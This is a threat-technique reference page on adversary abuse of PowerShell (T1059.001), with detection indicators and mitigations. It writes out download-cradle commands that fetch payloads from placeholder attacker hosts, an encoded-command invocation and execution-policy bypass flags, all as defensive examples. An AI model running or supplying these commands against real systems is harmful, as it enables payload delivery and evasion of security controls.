# Command and Scripting Interpreter: PowerShell

**Technique ID:** T1059.001  
**Tactic:** Execution  
**Parent Technique:** T1059 - Command and Scripting Interpreter  

## Overview

Adversaries may abuse PowerShell for execution. PowerShell is a powerful interactive command-line interface and scripting environment built into Microsoft Windows. It provides full access to .NET framework, Windows Management Instrumentation (WMI), and Win32 APIs, making it an ideal tool for administrative tasks as well as malicious activity.

## Common Adversary Tactics & Sub-techniques

Adversaries use PowerShell to execute commands, download payload cradles, bypass execution policies, and run in-memory scripts to evade disk-based detection.

### Encoded Command Execution (`-EncodedCommand`)

Attackers frequently encode PowerShell commands using Base64 via the `-EncodedCommand`, `-Enc`, or `-e` command-line flags.
- **Purpose:** Obfuscate malicious scripts, bypass string-matching firewall/IDS rules, and prevent casual command-line inspection.
- **Example Payload Structure:** `powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgA...`

### Download Cradles

PowerShell scripts often fetch secondary payloads from remote C2 servers or CDN infrastructure:
- `Invoke-WebRequest -Uri http://malicious-domain.com/payload.ps1 -OutFile payload.ps1`
- `(New-Object System.Net.WebClient).DownloadString('http://c2.example.com/stage2.ps1')`
- `Start-BitsTransfer -Source http://attacker.com/loader.exe`

### Execution Policy Bypass

The default Windows PowerShell execution policy restricts running unsigned scripts. Adversaries bypass this using flags:
- `-ExecutionPolicy Bypass` or `-EP Bypass`
- `-Scope Process`

## Detection & Indicators of Compromise (IOCs)

1. `powershell.exe` spawned by non-standard parent processes such as Microsoft Office (`winword.exe`, `excel.exe`), Web Servers (`w3wp.exe`), or SQL Server (`sqlservr.exe`).
2. Suspicious command-line flags: `-WindowStyle Hidden`, `-W Hidden`, `-NoProfile`, `-NonInteractive`, `-EncodedCommand`.
3. Outbound network connections originated directly by `powershell.exe` to external IP addresses.
4. Windows Script Block Logging (Event ID 4104) and Module Logging (Event ID 4103) capturing de-obfuscated script content.

## Investigation & Mitigation

- **Decode Payload:** Always decode Base64 arguments captured in process creation logs (Event ID 4688 / Sysmon Event ID 1).
- **Inspect Parent Process:** Track process lineage to determine initial execution vector.
- **Constrained Language Mode:** Enforce PowerShell Constrained Language Mode (CLM) alongside AppLocker or WDAC.
